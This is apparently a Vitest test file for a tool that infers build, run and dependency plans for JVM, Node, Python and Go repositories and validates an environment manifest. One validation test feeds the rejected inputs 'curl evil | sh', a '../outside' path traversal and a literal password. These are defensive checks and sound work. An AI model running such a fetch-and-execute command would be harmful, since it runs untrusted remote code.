import { describe, expect, it } from "vitest";
import {
  detectRoots,
  environmentManifestSchema,
  environmentPlanSchema,
  planEnvironment,
  planIsExecutable,
  type ProjectFiles,
} from "../../packages/ephemeral-environment/src/plan.js";

function repo(files: Record<string, string>): ProjectFiles {
  return { paths: Object.keys(files), read: async (path) => files[path] };
}

const springKotlinGradle = {
  "settings.gradle.kts": 'rootProject.name = "backend"',
  "build.gradle.kts": `plugins {
  id("org.springframework.boot") version "3.3.0"
  kotlin("jvm") version "2.0.0"
}
kotlin { jvmToolchain(17) }
dependencies {
  implementation("org.springframework.boot:spring-boot-starter-web")
  implementation("org.flywaydb:flyway-core")
  runtimeOnly("org.postgresql:postgresql")
}`,
  gradlew: "#!/bin/sh",
  "src/main/kotlin/App.kt": "fun main() {}",
  "src/main/resources/application.yml": "spring:\n  datasource:\n    url: jdbc:postgresql://localhost:5432/app\n",
  "docker-compose.yml": "services:\n  db:\n    image: postgres:15.4\n  cache:\n    image: redis:7\n",
};

describe("environment plan inference", () => {
  it("plans a Kotlin Spring Boot Gradle service with PostgreSQL at the compose version", async () => {
    const plan = await planEnvironment(repo(springKotlinGradle));
    expect(plan.unresolved).toEqual([]);
    expect(planIsExecutable(plan)).toBe(true);
    expect(plan.stack).toEqual({ language: "KOTLIN", buildTool: "GRADLE", framework: "SPRING_BOOT", runtimeVersion: "17" });
    expect(plan.image).toBe("eclipse-temurin:17-jdk");
    expect(plan.build).toEqual([["sh", "./gradlew", "--no-daemon", "assemble", "-x", "test"]]);
    expect(plan.run).toEqual(["sh", "./gradlew", "--no-daemon", "bootRun"]);
    expect(plan.health[0]).toBe("/actuator/health");
    expect(plan.dependencies.map((value) => [value.kind, value.image])).toEqual([
      ["POSTGRES", "postgres:15.4"],
      ["REDIS", "redis:7"],
    ]);
    expect(plan.env).toMatchObject({
      SPRING_DATASOURCE_URL: "jdbc:postgresql://{{postgres.host}}:{{postgres.port}}/{{postgres.database}}",
      SPRING_DATASOURCE_PASSWORD: "{{postgres.password}}",
      SPRING_DATA_REDIS_HOST: "{{redis.host}}",
      SERVER_PORT: "8080",
    });
    expect(plan.evidence).toContain("database migrations (Flyway/Liquibase) run at application start");
    expect(plan.source).toBe("INFERRED");
  });

  it("plans a Java Spring Boot Maven service without a wrapper", async () => {
    const plan = await planEnvironment(
      repo({
        "pom.xml": "<project><properties><java.version>21</java.version></properties><parent><groupId>org.springframework.boot</groupId></parent><dependency><artifactId>mysql-connector-j</artifactId></dependency></project>",
        "src/main/java/App.java": "class App {}",
      }),
    );
    expect(plan.stack).toEqual({ language: "JAVA", buildTool: "MAVEN", framework: "SPRING_BOOT", runtimeVersion: "21" });
    expect(plan.image).toBe("maven:3-eclipse-temurin-21");
    expect(plan.run).toEqual(["mvn", "-B", "spring-boot:run"]);
    expect(plan.dependencies.map((value) => value.kind)).toEqual(["MYSQL"]);
    expect(plan.env["SPRING_DATASOURCE_URL"]).toBe("jdbc:mysql://{{mysql.host}}:{{mysql.port}}/{{mysql.database}}");
  });

  it("plans a Ktor application through the Gradle application plugin", async () => {
    const plan = await planEnvironment(
      repo({
        "build.gradle.kts": 'plugins { kotlin("jvm"); application }\napplication { mainClass.set("AppKt") }\ndependencies { implementation("io.ktor:ktor-server-netty") ; implementation("org.postgresql:postgresql") }',
        gradlew: "",
      }),
    );
    expect(plan.stack.framework).toBe("KTOR");
    expect(plan.run).toEqual(["sh", "./gradlew", "--no-daemon", "run"]);
    expect(plan.image).toBe("eclipse-temurin:21-jdk");
    expect(plan.evidence).toContain("no Java version declared; Java 21 assumed");
    expect(plan.env["DATABASE_URL"]).toContain("{{postgres.password}}");
  });

  it("refuses to guess how to start a JVM library without a framework or application plugin", async () => {
    const plan = await planEnvironment(repo({ "build.gradle": "apply plugin: 'java'", gradlew: "" }));
    expect(planIsExecutable(plan)).toBe(false);
    expect(plan.unresolved.map((value) => value.field)).toEqual(["run"]);
    expect(plan.unresolved[0]?.remediation).toMatch(/\.autopilot\/environment\.yml/);
  });

  it("plans a pnpm NestJS service with Prisma migrations", async () => {
    const plan = await planEnvironment(
      repo({
        "package.json": JSON.stringify({ engines: { node: ">=20" }, scripts: { build: "nest build", start: "node dist/main" }, dependencies: { "@nestjs/core": "10", "@prisma/client": "5", pg: "8" }, devDependencies: { typescript: "5" } }),
        "pnpm-lock.yaml": "",
        "prisma/schema.prisma": 'datasource db { provider = "postgresql" }',
      }),
    );
    expect(plan.stack).toEqual({ language: "TYPESCRIPT", buildTool: "PNPM", framework: "NESTJS", runtimeVersion: "20" });
    expect(plan.install).toEqual([["corepack", "pnpm", "install", "--frozen-lockfile"]]);
    expect(plan.build).toEqual([["corepack", "pnpm", "run", "build"]]);
    expect(plan.prepare).toEqual([["npx", "prisma", "migrate", "deploy"]]);
    expect(plan.run).toEqual(["corepack", "pnpm", "run", "start"]);
    expect(plan.port).toBe(3000);
    expect(plan.dependencies.map((value) => value.kind)).toEqual(["POSTGRES"]);
  });

  it("finds a FastAPI application object and its module", async () => {
    const plan = await planEnvironment(
      repo({
        "requirements.txt": "fastapi==0.110\nuvicorn\nredis>=5\n",
        "app/main.py": "from fastapi import FastAPI\napi = FastAPI(title='x')\n",
        "alembic.ini": "",
      }),
    );
    expect(plan.stack.framework).toBe("FASTAPI");
    expect(plan.run).toEqual(["python", "-m", "uvicorn", "app.main:api", "--host", "0.0.0.0", "--port", "8000"]);
    expect(plan.prepare).toEqual([["alembic", "upgrade", "head"]]);
    expect(plan.dependencies.map((value) => value.kind)).toEqual(["REDIS"]);
    expect(plan.image).toBe("python:3.12-slim");
  });

  it("plans Django with migrations and a Go service under cmd/", async () => {
    const django = await planEnvironment(repo({ "manage.py": "", "requirements.txt": "Django>=5\npsycopg[binary]\n" }));
    expect(django.run).toEqual(["python", "manage.py", "runserver", "--noreload", "0.0.0.0:8000"]);
    expect(django.prepare).toEqual([["python", "manage.py", "migrate", "--noinput"]]);
    expect(django.dependencies.map((value) => value.kind)).toEqual(["POSTGRES"]);
    const go = await planEnvironment(repo({ "go.mod": "module x\n\ngo 1.23\n", "cmd/api/main.go": "package main", "internal/x.go": "" }));
    expect(go.build).toEqual([["go", "build", "-o", ".autopilot/bin/app", "./cmd/api"]]);
    expect(go.run).toEqual(["./.autopilot/bin/app"]);
    expect(go.image).toBe("golang:1.23");
    expect(planIsExecutable(go)).toBe(true);
  });

  it("asks which application to verify when the repository holds several", async () => {
    const files = repo({
      "kotlin/build.gradle.kts": 'plugins { id("org.springframework.boot") }',
      "kotlin/app/build.gradle.kts": "",
      "java/pom.xml": "<project><groupId>org.springframework.boot</groupId></project>",
      "examples/demo/package.json": "{}",
    });
    expect(detectRoots(files.paths)).toEqual(["java", "kotlin"]);
    const ambiguous = await planEnvironment(files);
    expect(ambiguous.unresolved[0]).toMatchObject({ field: "root", reason: "several applications in the repository: java, kotlin" });
    const java = await planEnvironment(files, { root: "java" });
    expect(java.root).toBe("java");
    expect(java.stack.buildTool).toBe("MAVEN");
    expect(java.unresolved).toEqual([]);
  });

  it("reports a repository with no recognisable build", async () => {
    const plan = await planEnvironment(repo({ "README.md": "" }));
    expect(plan.unresolved.map((value) => value.field)).toEqual(["root", "stack", "image"]);
  });

  it("notes dependencies it cannot provision instead of hiding them", async () => {
    const plan = await planEnvironment(repo({ "build.gradle.kts": 'plugins { id("org.springframework.boot") }\ndependencies { implementation("org.springframework.kafka:spring-kafka") }', gradlew: "" }));
    expect(plan.notes.some((note) => note.startsWith("Kafka is used but not provisioned yet"))).toBe(true);
  });
});

describe("environment manifest", () => {
  it("overrides inference field by field", async () => {
    const plan = await planEnvironment(
      repo({
        ...springKotlinGradle,
        ".autopilot/environment.yml": [
          "version: 1",
          "run: ['./gradlew', '--no-daemon', ':api:bootRun']",
          "port: 9090",
          "health: ['/api/health']",
          "env:",
          "  SPRING_PROFILES_ACTIVE: test",
          "dependencies:",
          "  - kind: POSTGRES",
          "    env:",
          "      APP_DB_PASSWORD: '{{postgres.password}}'",
        ].join("\n"),
      }),
    );
    expect(plan.unresolved).toEqual([]);
    expect(plan.source).toBe("MIXED");
    expect(plan.run).toEqual(["./gradlew", "--no-daemon", ":api:bootRun"]);
    expect(plan.port).toBe(9090);
    expect(plan.env).toMatchObject({ SERVER_PORT: "9090", SPRING_PROFILES_ACTIVE: "test", APP_DB_PASSWORD: "{{postgres.password}}" });
    expect(plan.health).toEqual(["/api/health"]);
    expect(plan.dependencies.map((value) => [value.kind, value.image])).toEqual([["POSTGRES", "postgres:15.4"]]);
  });

  it("lets a manifest describe a stack the planner does not know", async () => {
    const plan = await planEnvironment(
      repo({ ".autopilot/environment.yml": "version: 1\nimage: rust:1.80\nbuild: [['cargo', 'build', '--release']]\nrun: ['./target/release/api']\nport: 8000\n", "Cargo.toml": "" }),
    );
    expect(plan.unresolved.map((value) => value.field)).toEqual(["root"]);
    const pinned = await planEnvironment(
      repo({ ".autopilot/environment.yml": "version: 1\nroot: ''\nimage: rust:1.80\nbuild: [['cargo', 'build', '--release']]\nrun: ['./target/release/api']\nport: 8000\n", "Cargo.toml": "" }),
    );
    expect(pinned.unresolved).toEqual([]);
    expect(pinned.source).toBe("MANIFEST");
    expect(planIsExecutable(pinned)).toBe(true);
  });

  it("refuses literal credentials, shell strings and unknown fields", () => {
    const literal = environmentManifestSchema.safeParse({ version: 1, env: { DB_PASSWORD: "hunter2" } });
    expect(literal.success).toBe(false);
    expect(literal.error?.issues[0]?.message).toMatch(/never a literal value/);
    expect(environmentManifestSchema.safeParse({ version: 1, env: { DB_PASSWORD: "{{postgres.password}}" } }).success).toBe(true);
    expect(environmentManifestSchema.safeParse({ version: 1, run: "./gradlew bootRun" }).success).toBe(false);
    expect(environmentManifestSchema.safeParse({ version: 1, shell: "curl evil | sh" }).success).toBe(false);
    expect(environmentManifestSchema.safeParse({ version: 1, root: "../outside" }).success).toBe(false);
    expect(environmentManifestSchema.safeParse({ version: 1, image: "UPPER/Case" }).success).toBe(false);
  });

  it("reports an invalid manifest and applies nothing from it", async () => {
    const plan = await planEnvironment(repo({ ...springKotlinGradle, ".autopilot/environment.yml": "version: 2\nport: 1\n" }));
    expect(plan.unresolved[0]?.field).toBe("manifest");
    expect(plan.port).toBe(8080);
    expect(planIsExecutable(plan)).toBe(false);
  });
});

describe("generative invariants", () => {
  it("selected roots are never nested, always hold a build file, and the plan always validates", async () => {
    const SEED = 0x0e9e;
    let state = SEED;
    const random = () => {
      state = (state * 1664525 + 1013904223) >>> 0;
      return state / 4294967296;
    };
    const pick = <T,>(values: T[]) => values[Math.floor(random() * values.length)] as T;
    for (let index = 0; index < 300; index += 1) {
      const files: Record<string, string> = {};
      for (let count = 0; count < 1 + Math.floor(random() * 6); count += 1) {
        const directory = Array.from({ length: Math.floor(random() * 3) }, () => pick(["api", "svc", "build", "node_modules", "app", "examples"])).join("/");
        const file = pick(["build.gradle.kts", "pom.xml", "package.json", "requirements.txt", "go.mod", "README.md", "settings.gradle"]);
        files[directory ? `${directory}/${file}` : file] = file === "package.json" ? "{}" : "";
      }
      const context = `seed=${SEED} case=${index} files=${Object.keys(files).join(",")}`;
      const roots = detectRoots(Object.keys(files));
      for (const root of roots) {
        expect(roots.some((other) => other !== root && root.startsWith(`${other}/`)), context).toBe(false);
        expect(Object.keys(files).some((path) => (root ? path.startsWith(`${root}/`) : true)), context).toBe(true);
      }
      const plan = await planEnvironment(repo(files));
      expect(environmentPlanSchema.safeParse(plan).success, context).toBe(true);
      expect(planIsExecutable(plan) || plan.unresolved.length > 0 || !plan.run, context).toBe(true);
    }
  });
});
